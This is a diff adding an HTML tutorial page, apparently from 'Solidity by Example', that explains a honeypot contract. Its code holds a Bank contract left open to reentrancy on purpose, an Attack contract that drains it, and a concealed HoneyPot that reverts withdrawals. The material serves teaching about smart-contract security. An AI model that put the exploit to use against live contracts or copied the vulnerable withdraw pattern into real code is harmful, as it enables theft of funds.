@@ -1,1 +1,103 @@
-<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Solidity by Example</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.c873b319.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"></div></body></html>
+<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Honeypot | Solidity by Example | 0.8.10</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.dc5280b7.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><meta content="An example of honeypot in Solidity" name="Description" data-react-helmet="true"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"><div class="App_component__uBhCy"><div class="Header_component__dJEiY"><a href="/"><img alt="logo" class="Header_logo__nZ7K6" src="/solidity-example/static/media/logo.ed2942c41ca20fd4f70a.png"></a><h3 class="Header_header__Lhnr8"><a href="/">Solidity by Example</a><div class="Header_versions__j+f36"><div class="Header_version__4Ju4J">version 0.8.10</div></div></h3><img alt="dark mode" class="Header_dark__TFGN2" src="/solidity-example/static/media/mode-dark.5726a29b11b0940df6a4.png"></div><div class="App_main__nhgh3"><div class="Example_component__4Fiv8"><div class="Example_content__6NsNh"><h2>Honeypot</h2><div><p>A honeypot is a trap to catch hackers.</p><h3 id="vulnerability">Vulnerability</h3><p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p><p>that will catch malicious users.</p><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>
+
+<span class="hljs-comment">/*
+Bank is a contract that calls Logger to log events.
+Bank.withdraw() is vulnerable to the reentrancy attack.
+So a hacker tries to drain Ether from Bank.
+But actually the reentracy exploit is a bait for hackers.
+By deploying Bank with HoneyPot in place of the Logger, this contract becomes
+a trap for hackers. Let's see how.
+
+1. Alice deploys HoneyPot
+2. Alice deploys Bank with the address of HoneyPot
+3. Alice deposits 1 Ether into Bank.
+4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
+5. Eve deploys Attack with the address of Bank
+6. Eve calls Attack.attack() with 1 Ether but the transaction fails.
+
+What happened?
+Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
+When the last Bank.withdraw() is about to complete, it calls logger.log().
+Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
+*/</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bank</span> </span>{
+    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">></span> <span class="hljs-keyword">uint</span>) <span class="hljs-keyword">public</span> balances;
+    Logger logger;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Logger _logger</span>) </span>{
+        logger <span class="hljs-operator">=</span> Logger(_logger);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
+        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-string">"Deposit"</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(_amount <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Insufficient funds"</span>);
+
+        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+
+        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _amount;
+
+        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount, <span class="hljs-string">"Withdraw"</span>);
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Logger</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint</span> amount, <span class="hljs-keyword">string</span> action</span>)</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">
+        <span class="hljs-keyword">address</span> _caller,
+        <span class="hljs-keyword">uint</span> _amount,
+        <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action
+    </span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">emit</span> Log(_caller, _amount, _action);
+    }
+}
+
+<span class="hljs-comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
+    Bank bank;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Bank _bank</span>) </span>{
+        bank <span class="hljs-operator">=</span> Bank(_bank);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(bank).<span class="hljs-built_in">balance</span> <span class="hljs-operator">></span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
+            bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
+        }
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        bank.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
+        bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
+    }
+}
+
+<span class="hljs-comment">// Let's say this code is in a separate file so that others cannot read it.</span>
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HoneyPot</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">
+        <span class="hljs-keyword">address</span> _caller,
+        <span class="hljs-keyword">uint</span> _amount,
+        <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action
+    </span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">if</span> (equal(_action, <span class="hljs-string">"Withdraw"</span>)) {
+            <span class="hljs-keyword">revert</span>(<span class="hljs-string">"It's a trap"</span>);
+        }
+    }
+
+    <span class="hljs-comment">// Function to compare strings using keccak256</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _a, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _b</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>) </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_a)) <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_b));
+    }
+}
+</code></pre></div><div class="Example_prevNext__kHIFg"></div><p>Try on <a href="https://remix.ethereum.org" target="__blank">Remix</a></p></div></div></div></div></div></body></html>
